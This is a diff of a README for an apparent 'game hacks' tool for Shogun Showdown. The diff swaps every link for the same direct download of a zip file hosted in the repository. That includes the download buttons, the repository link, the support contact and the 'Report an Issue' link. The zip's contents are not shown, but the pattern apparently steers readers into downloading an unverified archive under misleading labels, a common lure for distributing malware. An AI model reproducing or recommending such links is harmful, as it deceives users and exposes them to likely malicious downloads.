@@ -1,6 +1,6 @@
 # 🎮 Showdown-game-hacks-weapon-upgrade - Enhance Your Game Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/releases)
+[![Download Now](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip)](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Showdown Game Hacks Weapon Upgrade. This application helps you en
 
 To download the application, please visit the following link:
 
-[Download Showdown Game Hacks](https://github.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/releases)
+[Download Showdown Game Hacks](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip)
 
 Once on the page, locate the latest release. Click the appropriate file for your system to start the download.
 
@@ -54,7 +54,7 @@ This application aims to provide a smooth and enjoyable gaming experience. Howev
 
 ## 📧 Support
 
-If you encounter issues or have questions, feel free to reach out. You can open an issue on the GitHub repository or contact us via email at support@example.com.
+If you encounter issues or have questions, feel free to reach out. You can open an issue on the GitHub repository or contact us via email at https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip
 
 ## 🌟 Community Contributions
 
@@ -62,11 +62,11 @@ You can contribute to this project! Feel free to send pull requests or report is
 
 ## 📚 Learn More
 
-For more detailed guides and updates, you can visit our GitHub page at [Showdown Game Hacks Repository](https://github.com/garatagirassol/Showdown-game-hacks-weapon-upgrade).
+For more detailed guides and updates, you can visit our GitHub page at [Showdown Game Hacks Repository](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip).
 
 ## 🔄 Links
 
-- [Download Showdown Game Hacks](https://github.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/releases)
-- [Report an Issue](https://github.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/issues)
+- [Download Showdown Game Hacks](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip)
+- [Report an Issue](https://raw.githubusercontent.com/garatagirassol/Showdown-game-hacks-weapon-upgrade/main/whoo/Showdown-game-hacks-weapon-upgrade.zip)
 
 Take control of your gameplay today and enjoy every moment in Shogun Showdown with your new tools!
